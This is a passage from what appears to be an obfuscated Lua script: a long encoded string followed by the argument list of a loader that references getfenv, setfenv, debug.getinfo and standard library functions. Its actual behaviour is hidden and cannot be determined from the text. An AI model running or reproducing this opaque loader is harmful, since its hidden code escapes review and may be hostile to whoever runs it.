83RC83QXM3RBP3PAH23Z3QYA35YG3RC53R1U3RBW3LDX3RC935WN3R8A3EUA23S3QYA35G43RCG3RCR3R0Y3RBM3RCK3RC03MTQ23T3QYA22R36HA3R5W3RCT3RD53QOY3QGX3R0E3RB93QU323U3QYA3E1A3Q1J3RCH3QSA3RCU3KX536Z83RC73R7S3QZJ23V3QYA3NPP39ZO3RBV3E583RDQ3EZB3RDG3R1M3RCB3QZJ23O3QYA374O3RDN3RD23RCJ3LDX3RDR3I3R3RCI3RDU3QU323P3QYA3NR33RDZ3RDO3RD43REE3RE33R8W3R9A3FDG3QYA2483RDB3RE03RED3QX13LDX3RE43R3C3RCW350O3L103R1R3E0W3RBE3MTQ3L0N3R1R3NT83RAX3MTQ23L3QYA36WM3RF93NJ43L063R1R32W03RFE3NJ423N3QYA3KKA3RB73RBL3RDI3O662583QYA336W3RFO3PTP2593QYA3KKH3RFT3RCS3R5R3QU325A3QYA360Z3RFJ3PTP25B3QYA3NX33RG03EUA2543QYA3KKS3RG53RD33RFV3PAH2553QYA3NXV3RGH350O2563QYA35G73RGC3EUA2573QYA3NZA3QX93REO3E583DQ43R5Q3RA13QU32503QYA36VR3QXK3QY43RH63R063RH83O662513QYA360L3QPG3RH43EZ83RHF3RDH3RE63QU32523QYA363C3RH33REC3EYZ3RHP3RE53REI3O663L4B3R1R36003RHD3RH53RES3R2K24W3QYA35KU3RI63RHO3RI83R1X24X3QYA3CCR3RHW3R5P3RHY3RIF3R1H2Z53R1R3KL53RID3RIM3RDT3RF43ODU3QYA35R13RIK3R163RHZ3RF33R8X350O24S3QYA3CNN3RIZ3EZB3RJ13R3V3RJ33OGB3QYA3O5B3RJ83LDX3RJA3R6H3QU324U3QYA3O5R3RJG3QOY3RJI3RCL3MTQ24V3QYA3O653RJO3QSA3RJQ3RD63NJ424O3QYA3O6M3RJW3RHE3RIN3R4K24P3QYA34OQ3RIS3AFF3RJY3RG73O6624Q3QYA3O7E3RK43RI73RIU3RJC24R3QYA3O7S3RKJ3RIE3RKL3RET24K3QYA3O873RKQ3RIT3REH3RIV24L3QYA34PW3RGT1S24M3QYA3O903RL424N3QYA34Q23RL43L3C3R1R34O73RGY350O3L303R1R3OA93RL424I3QYA36TE3RF934RK350O3OB533KH34RB350O3L2J32K83FFZ32O83KMD330U3KMJ32O83D02330U3G8R32O83KMV33UH2W4264330Y2W4339C3D0G3A3S31OS3CP83A2T3EYZ3RCU3D4U3AFF3RLZ3EYZ3QHT3RHQ3EYZ3RM13E583RM33EYZ3RM537CN2W438N633W93KN03NWK1S2653QOC3DU13OC03BH53RMS3AFF3QHM3GIO3EZB3RN33EZ83QQ33E583QOJ36JZ3CSR3IGS34C5',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
